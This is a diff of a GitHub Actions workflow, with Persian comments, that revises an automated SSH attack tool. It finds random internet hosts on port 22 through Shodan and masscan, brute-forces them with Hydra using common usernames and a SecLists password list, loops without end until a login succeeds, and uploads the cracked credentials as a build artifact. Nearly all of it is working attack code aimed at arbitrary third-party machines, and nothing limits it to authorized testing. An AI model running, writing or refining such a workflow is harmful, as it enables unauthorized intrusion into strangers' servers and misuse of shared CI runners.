@@ -1,109 +1,122 @@
-name: ∞ Persistent Auto SSH Cracker
+name: Single Auto SSH Cracker (Never Stop)
 
 on:
-  workflow_dispatch:  # فقط دستی
+  workflow_dispatch:   # فقط دستی
+    inputs:
+      max_duration_minutes:
+        description: 'حداکثر زمان اجرا (دقیقه) – 0 یعنی بی‌نهایت'
+        default: '0'
 
 jobs:
-  auto-attack:
-    runs-on: [self-hosted, linux]  # حتماً باید روی رانر شخصی شرکت اجرا بشه
-    strategy:
-      fail-fast: false
-      matrix:
-        shard: [0,1,2,3,4,5]
-
+  turbo-cracker:
+    runs-on: ubuntu-latest
     steps:
-      - name: 🛠️ Install ultra tools
+      - name: 🚀 Install fastest tools
         run: |
           sudo apt update
-          sudo apt install -y masscan hydra sshpass jq curl
+          sudo apt install -y hydra sshpass masscan jq curl
 
-      - name: 🔁 Persistent loop (never stops until success)
-        id: persistent
+      - name: Prepare password dictionary (Top 5000)
         run: |
-          SHARD_ID=${{ matrix.shard }}
-          TOTAL_SHARDS=${{ strategy.job-total }}
+          curl -s -o passwords.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/500-worst-passwords.txt
+          # اگر نتونست دانلود کنه، یه دیکشنری پیش‌فرض بساز
+          if [ ! -s passwords.txt ]; then
+            printf "123456\npassword\n12345678\nqwerty\nabc123\nadmin\nroot\n12345\nletmein\nwelcome\n" > passwords.txt
+          fi
+
+      - name: 🔁 Unlimited attack loop (auto discover + crack)
+        id: main
+        run: |
+          PASSWORDS="passwords.txt"
+          USERNAMES=("root" "admin" "user" "ubuntu" "pi")
+          START_TIME=$(date +%s)
+          MAX_TIME=${{ github.event.inputs.max_duration_minutes }}
           FOUND=0
-          RESULT_FILE="creds_${SHARD_ID}.txt"
-          PASSWORDS_FILE="passwords.txt"
-          # دیکشنری بزرگ رمز (میتونی فایل رو از جای دیگه بیاری)
-          curl -s -o $PASSWORDS_FILE https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt || \
-            echo -e "123456\npassword\nadmin\nroot\n12345678" > $PASSWORDS_FILE
 
-          USERNAMES=("root" "admin" "user" "ubuntu" "pi" "oracle")
-
-          # حلقه بی‌نهایت
+          # حلقه اصلی - هیچوقت تموم نمیشه مگه پیدا کنه یا زمان برسه
           while [ $FOUND -eq 0 ]; do
-            echo "[*] Auto-discovering fresh targets (Shard $SHARD_ID)..."
-
-            # ========== 1. کشف خودکار هاست ==========
-            TARGETS_FILE="targets_${SHARD_ID}.txt"
-            > $TARGETS_FILE
-
-            # روش اول: استفاده از Shodan (اگر API key تنظیم شده باشد)
-            if [ -n "${{ secrets.SHODAN_API_KEY }}" ]; then
-              curl -s "https://api.shodan.io/shodan/host/search?key=${{ secrets.SHODAN_API_KEY }}&query=port:22&size=100" | \
-                jq -r '.matches[] | .ip_str + ":22"' >> $TARGETS_FILE
-            fi
-
-            # اگر تعداد هاست کم است، مکمل با masscan تصادفی روی چند شبکه عمومی (به صورت تصادفی)
-            if [ $(wc -l < $TARGETS_FILE) -lt 50 ]; then
-              # تولید یک زیرشبکه تصادفی کلاس C
-              RANDOM_A=$((RANDOM%223+1))
-              RANDOM_B=$((RANDOM%256))
-              RANDOM_C=$((RANDOM%256))
-              SUBNET="${RANDOM_A}.${RANDOM_B}.${RANDOM_C}.0/24"
-              sudo masscan $SUBNET -p22 --rate=1000 --wait=0 -oL masscan.raw 2>/dev/null
-              grep -E "open" masscan.raw | awk '{print $4":"$3}' >> $TARGETS_FILE
-            fi
-
-            # حذف تکراری‌ها
-            sort -u -o $TARGETS_FILE $TARGETS_FILE
-
-            # ========== 2. تقسیم هاست بین شاردها با هش ==========
-            MY_HOSTS="myhosts_${SHARD_ID}.txt"
-            > $MY_HOSTS
-            while read line; do
-              ip=$(echo $line | cut -d: -f1)
-              # هش ساده آی‌پی برای اختصاص به یک شارد
-              hash=$(echo $ip | md5sum | cut -c1-8)
-              hash_num=$((16#$hash))
-              if [ $((hash_num % TOTAL_SHARDS)) -eq $SHARD_ID ]; then
-                echo $line >> $MY_HOSTS
+            # اگر زمان حداکثر تعیین شده و رد شده، خارج شو
+            if [ $MAX_TIME -ne 0 ]; then
+              NOW=$(date +%s)
+              ELAPSED=$(( (NOW - START_TIME) / 60 ))
+              if [ $ELAPSED -ge $MAX_TIME ]; then
+                echo "Time limit reached. Exiting."
+                break
               fi
-            done < $TARGETS_FILE
+            fi
 
-            if [ ! -s $MY_HOSTS ]; then
-              echo "No hosts assigned to shard $SHARD_ID, sleeping 10s..."
-              sleep 10
+            echo "===== [ $(date) ] Discovering fresh targets ====="
+            TARGETS="targets.txt"
+            > $TARGETS
+
+            # روش 1: استفاده از Shodan (اگر کلید تنظیم شده باشه)
+            if [ -n "${{ secrets.SHODAN_API_KEY }}" ]; then
+              echo "Using Shodan..."
+              curl -s "https://api.shodan.io/shodan/host/search?key=${{ secrets.SHODAN_API_KEY }}&query=port:22&size=50" | \
+                jq -r '.matches[] | .ip_str + ":22"' >> $TARGETS
+            fi
+
+            # اگر تعداد کمه، با masscan یک شبکه تصادفی کلاس C رو اسکن کن (سریع)
+            if [ $(wc -l < $TARGETS) -lt 20 ]; then
+              echo "Masscan random /24..."
+              # تولید یک IP رندوم کلاس C
+              A=$((RANDOM%223+1))
+              B=$((RANDOM%256))
+              C=$((RANDOM%256))
+              RANGE="$A.$B.$C.0/24"
+              # masscan نیاز به sudo داره ولی توی گیت‌هاب رانر بدون sudo هم شاید کار کنه؟ بهتره با sudo run
+              sudo masscan $RANGE -p22 --rate=2000 --wait=0 -oL masscan.out 2>/dev/null || true
+              grep -E "open" masscan.out 2>/dev/null | awk '{print $4":"$3}' >> $TARGETS
+            fi
+
+            # حذف تکراری و خالی
+            sort -u -o $TARGETS $TARGETS
+            TOTAL_HOSTS=$(wc -l < $TARGETS)
+            echo "Found $TOTAL_HOSTS unique hosts with port 22"
+
+            if [ $TOTAL_HOSTS -eq 0 ]; then
+              echo "No targets, sleeping 5 seconds..."
+              sleep 5
               continue
             fi
 
-            # ========== 3. حمله با Hydra روی هاست‌های خود ==========
+            # حمله با Hydra روی هر هاست (با نخ بالا)
             while read target; do
               ip=$(echo $target | cut -d: -f1)
               port=$(echo $target | cut -d: -f2)
-
+              
               for username in "${USERNAMES[@]}"; do
-                # تنظیم timeout برای هر هاست
-                echo "[>] Shard $SHARD_ID attacking $ip:$port as $username"
-                hydra -l "$username" -P $PASSWORDS_FILE -s "$port" -t 64 -o hydra_out.txt -f "$ip" ssh 2>/dev/null
-
-                if grep -q "host: $ip.*password:" hydra_out.txt; then
-                  password=$(grep "host: $ip.*password:" hydra_out.txt | head -1 | awk -F 'password: ' '{print $2}')
-                  echo "🎉 SUCCESS: $ip:$port|$username|$password" | tee -a $RESULT_FILE
+                echo "[*] Trying $username@$ip:$port"
+                # hydra با 128 نخ، timeout اتصال 5 ثانیه، و با found flag متوقف شو
+                hydra -l "$username" -P $PASSWORDS -s "$port" -t 128 -w 3 -o hydra.tmp -f "$ip" ssh 2>/dev/null
+                
+                if grep -q "host: $ip.*password:" hydra.tmp; then
+                  password=$(grep "host: $ip.*password:" hydra.tmp | head -1 | awk -F 'password: ' '{print $2}')
+                  echo "✅ SUCCESS: $ip:$port | $username | $password" | tee -a final_results.txt
                   FOUND=1
                   break 3
                 fi
+                rm -f hydra.tmp
               done
-            done < $MY_HOSTS
+            done < $TARGETS
 
-            # اگر پیدا نشد، سریع بره مرحله بعد (بدون sleep)
-            echo "No credentials found in this batch. Scanning new targets..."
+            # اگه پیدا کرد، حلقه رو بشکن
+            if [ $FOUND -eq 1 ]; then
+              echo "Password found! Exiting."
+              break
+            else
+              echo "No luck in this batch. Restarting discovery..."
+            fi
           done
 
-      - name: Upload credentials (if found)
-        if: always()
+          # ذخیره خروجی برای artifact
+          if [ $FOUND -eq 1 ]; then
+            echo "success=true" >> $GITHUB_OUTPUT
+          fi
+
+      - name: Upload found credentials
+        if: steps.main.outputs.success == 'true'
         uses: actions/upload-artifact@v4
         with:
-          name: final-creds-shard-${{ matrix.shard }}
-          path: creds_*.txt
+          name: cracked-passwords
+          path: final_results.txt
